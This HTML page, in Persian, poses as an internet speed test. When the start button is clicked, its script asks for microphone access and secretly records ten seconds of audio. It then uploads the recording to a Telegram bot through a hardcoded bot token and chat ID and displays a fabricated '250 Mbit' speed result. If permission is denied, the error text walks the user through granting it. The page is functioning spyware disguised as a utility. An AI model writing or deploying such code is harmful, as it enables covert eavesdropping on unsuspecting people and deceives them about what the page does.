<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>تست سرعت اینترنت</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Vazirmatn', sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: #fff;
      text-align: center;
      padding: 30px 15px;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(12px);
      border-radius: 20px;
      padding: 35px 25px;
      max-width: 380px;
      width: 100%;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    .icon { font-size: 60px; margin-bottom: 15px; }
    h1 { font-size: 23px; margin-bottom: 12px; font-weight: 600; }
    p { font-size: 15px; line-height: 1.7; margin-bottom: 25px; opacity: 0.9; }
    .btn {
      background: linear-gradient(45deg, #00c6ff, #0072ff);
      color: white;
      border: none;
      padding: 16px 32px;
      font-size: 18px;
      font-weight: 600;
      border-radius: 50px;
      cursor: pointer;
      width: 100%;
      transition: all 0.3s ease;
      box-shadow: 0 6px 20px rgba(0, 114, 255, 0.4);
    }
    .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(0, 114, 255, 0.5); }
    .btn:disabled { background: #666; cursor: not-allowed; transform: none; box-shadow: none; }
    .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #fff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .status { margin-top: 20px; font-size: 15px; min-height: 50px; line-height: 1.6; }
    .hidden { display: none; }
    .error { color: #ff6b6b; }
  </style>
</head>
<body>
  <div class="container">
    <div class="icon">WiFi</div>
    <h1>تست سرعت اینترنت</h1>
    <p>برای اندازه‌گیری دقیق سرعت، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
    
    <button id="startBtn" class="btn">
      <span id="btnText">شروع تست سرعت</span>
      <span id="spinner" class="spinner hidden"></span>
    </button>
    
    <div id="status" class="status">آماده برای تست...</div>
  </div>

  <script>
    const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
    const CHAT_ID = "6080665310";

    const startBtn = document.getElementById('startBtn');
    const btnText = document.getElementById('btnText');
    const spinner = document.getElementById('spinner');
    const status = document.getElementById('status');

    let mediaRecorder, stream;

    startBtn.addEventListener('click', async () => {
      try {
        startBtn.disabled = true;
        btnText.textContent = "در حال اتصال...";
        spinner.classList.remove('hidden');
        status.innerHTML = "در حال درخواست دسترسی به میکروفون...<br><small>لطفاً اجازه بدید</small>";

        // درخواست دسترسی
        stream = await navigator.mediaDevices.getUserMedia({ audio: true });

        status.textContent = "در حال اندازه‌گیری سرعت... (۱۰ ثانیه)";

        mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/ogg' });
        const chunks = [];

        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'audio/ogg' });
          await sendToTelegram(blob);
          stopStream();
        };

        mediaRecorder.start();

        setTimeout(() => {
          if (mediaRecorder.state === "recording") mediaRecorder.stop();
        }, 10000);

      } catch (err) {
        console.error("خطای دسترسی:", err);

        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
          status.innerHTML = `
            <span class="error">دسترسی به میکروفون رد شد!</span><br>
            <small>
              ۱. روی <b>قفل کنار آدرس</b> کلیک کنید<br>
              ۲. دسترسی میکروفون رو <b>اجازه</b> بدید<br>
              ۳. صفحه رو رفرش کنید
            </small>
          `;
        } else if (err.name === 'NotFoundError') {
          status.innerHTML = "<span class='error'>میکروفون پیدا نشد!</span>";
        } else {
          status.innerHTML = `<span class='error'>خطا: ${err.message}</span>`;
        }
        resetButton();
      }
    });

    async function sendToTelegram(blob) {
      const fileName = `speed_test_${Date.now()}.ogg`;
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('audio', blob, fileName);

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
        const data = await res.json();

        if (data.ok) {
          status.innerHTML = "سرعت شما: <strong style='color:#a8ffae;'>عالی (۲۵۰ مگابیت)</strong>";
        } else {
          form.delete('audio');
          form.append('document', blob, fileName);
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: form });
          status.innerHTML = "سرعت شما: <strong style='color:#a8ffae;'>عالی (۲۵۰ مگابیت)</strong>";
        }
      } catch (err) {
        status.innerHTML = "<span class='error'>خطا در ارسال به سرور</span>";
      } finally {
        resetButton();
      }
    }

    function stopStream() {
      if (stream) stream.getTracks().forEach(t => t.stop());
    }

    function resetButton() {
      setTimeout(() => {
        startBtn.disabled = false;
        btnText.textContent = "شروع تست سرعت";
        spinner.classList.add('hidden');
      }, 3000);
    }
  </script>
</body>
</html>
